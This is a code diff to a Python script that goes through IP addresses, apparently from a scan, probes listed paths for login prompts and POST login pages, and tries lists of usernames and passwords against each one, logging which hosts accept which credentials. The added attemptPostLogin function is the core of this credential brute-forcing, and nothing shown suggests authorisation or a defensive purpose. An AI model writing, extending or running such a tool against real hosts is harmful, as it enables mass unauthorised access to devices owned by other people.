@@ -18,7 +18,7 @@ with open("methods.json") as jsonFile:
 if (os.path.isdir("logs") == False):
     os.makedirs("logs")
 
-def attemptLogin(link: str):
+def attemptPromptLogin(link: str):
     try:
         option = options[int(response) - 1]
         usernames = option["usernames"]
@@ -37,6 +37,29 @@ def attemptLogin(link: str):
     except requests.exceptions.ConnectionError:
         return False
     
+def attemptPostLogin(link: str):
+    try:
+        option = options[int(response) - 1]
+        usernames = option["usernames"]
+        passwords = option["passwords"]
+
+        for username in usernames:
+            for password in passwords:
+                req = requests.post(link, data={
+                    "command": "login",
+                    "username": username,
+                    "password": password
+                }, timeout=5)
+
+                if (req.text.find("var failedinfo;") == -1):
+                    return (username, password)
+        
+        return False
+    except requests.exceptions.Timeout:
+        return False
+    except requests.exceptions.ConnectionError:
+        return False
+    
 def createLog(name: str, line: str):
     folder = f"logs/{currentTime}"
     file = f"{folder}/{name}.txt"
@@ -46,6 +69,15 @@ def createLog(name: str, line: str):
 
     with open(file, "a") as file:
         file.write(line + "\n")
+
+def doesItExist(link: str):
+    try:
+        req = requests.get(link, timeout=5)
+        return (req.status_code != 404)
+    except requests.exceptions.Timeout:
+        return False
+    except requests.exceptions.ConnectionError:
+        return False
 
 def hasPrompt(link: str):
     try:
@@ -134,11 +166,22 @@ try:
             else:
                 link = f"http://{ip_str}"
 
-            for method in methods:
+            # tries to check for prompts first
+            for method in methods["Prompt"]:
                 if (hasPrompt(link + method)):
                     foundMethod = True
-                    log(ip_str=ip_str, foundMethod=foundMethod, ableToLogin=attemptLogin(link + method))
+                    log(ip_str=ip_str, foundMethod=foundMethod, ableToLogin=attemptPromptLogin(link + method))
+                    break
 
+            # if that didnt work, we will try to check for login pages that use POST
+            if (foundMethod == False):
+                for method in methods["Post"]:
+                    if (doesItExist(link + method)):
+                        foundMethod = True
+                        log(ip_str=ip_str, foundMethod=foundMethod, ableToLogin=attemptPostLogin(link + method))
+                        break
+
+            # if no method worked, we check if website is up or not
             if (foundMethod == False):
                 try:
                     req = requests.get(link, timeout=5)
